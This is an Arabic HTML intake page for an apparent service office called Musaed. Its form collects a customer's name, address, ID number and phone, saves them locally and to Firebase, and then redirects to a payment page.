<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>بيانات العميل | مكتب مساعد</title>
  <link rel="stylesheet" href="customer.css">
</head>
<body>
  <main class="app">
    <section class="content">
      <header class="heading">
        <div class="mark">م</div>
        <h1><span>مرحبًا بك</span></h1>
        <p>يرجى إدخال معلوماتك للمتابعة</p>
      </header>
      <p class="form-note">أكمل جميع الحقول التالية، ثم فعّل الإقرار للمتابعة.</p>
      <form class="form" id="customer-form">
        <input type="text" placeholder="الاسم الكامل" autocomplete="name" required>
        <input type="text" placeholder="العنوان" autocomplete="street-address" required>
        <input type="text" placeholder="رقم البطاقةالشخصية / بطاقة الاقامة" required>
        <input type="tel" placeholder="رقم الجوال" autocomplete="tel" inputmode="tel" required>
        <label class="confirm"><input type="checkbox" required> أقر بأن البيانات المعينة دقيقة وصحيحة</label>
        <button type="submit">استمرار</button>
      </form>
      <p id="submit-status" class="submit-status" role="status" aria-live="polite"></p>
    </section>
  </main>
  <script type="module" src="draft-sync.js"></script>
  <script type="module">
    import { db, collection, addDoc, serverTimestamp } from './firebase.js';

    document.querySelector('#customer-form').addEventListener('submit', async event => {
      event.preventDefault();
      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
      const status = document.querySelector('#submit-status');
      const values = [...event.currentTarget.querySelectorAll('input')];
      const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
      // لا نسمح أبدًا بإعادة استخدام معرّف Firebase الخاص بطلب سابق.
      delete draft.firebaseDocumentId;
      delete draft.customerSyncPending;
      draft.customerName = values[0].value;
      draft.address = values[1].value;
      draft.apartment = values[2].value;
      draft.phone = values[3].value;
      localStorage.setItem('musaedDraft', JSON.stringify(draft));
      submitButton.disabled = true;
      submitButton.textContent = 'جارٍ الحفظ…';
      status.textContent = 'جارٍ حفظ بياناتك والانتقال للخطوة التالية…';
      try {
        const saveRequest = addDoc(collection(db, 'users'), {
          ...draft,
          status: 'بيانات العميل',
          createdAt: serverTimestamp()
        });
        const timeout = new Promise((_, reject) => {
          window.setTimeout(() => reject(new Error('انتهت مهلة الاتصال')), 3000);
        });
        const userDocument = await Promise.race([saveRequest, timeout]);
        draft.firebaseDocumentId = userDocument.id;
        localStorage.setItem('musaedDraft', JSON.stringify(draft));
        window.location.href = 'payment.html';
      } catch (error) {
        // لا نمنع العميل من المتابعة إذا كان Firebase أو الشبكة بطيئَين.
        // تبقى البيانات محفوظة محليًا ويمكن متابعة الطلب بصورة طبيعية.
        console.error('تعذر حفظ بيانات العميل في Firebase:', error);
        draft.customerSyncPending = true;
        localStorage.setItem('musaedDraft', JSON.stringify(draft));
        status.textContent = 'تأخر الاتصال، سيتم الانتقال الآن.';
        window.setTimeout(() => { window.location.href = 'payment.html'; }, 500);
      }
    });
  </script>
</body>
</html>
